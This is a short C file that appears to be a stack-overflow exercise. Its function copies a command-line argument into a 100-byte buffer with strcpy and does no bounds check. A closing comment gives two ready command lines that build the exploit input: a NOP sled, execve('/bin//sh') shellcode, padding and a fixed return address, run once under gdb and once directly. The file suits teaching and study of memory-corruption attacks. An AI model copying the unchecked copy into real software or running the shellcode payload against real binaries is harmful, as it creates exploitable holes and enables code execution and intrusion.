#include <string.h>
#include <stdio.h>

void doit(char *ss) {
	char buffer[100];
	strcpy(buffer, ss);    // without checking the actual size of argv.    
    printf("Done!\n");     // good place to set breakpoint
}

void main(int argc, char *argv[]) {
	doit(argv[1]);
}

/*
 * gdb: run $(python -c 'print "\x90"*(64)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"A"*25 + "\x02\xce\xff\xff"') 
 * run: ./stack2 $(python -c 'print "\x90"*(64)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"A"*25 + "\x52\xce\xff\xff"')
 */
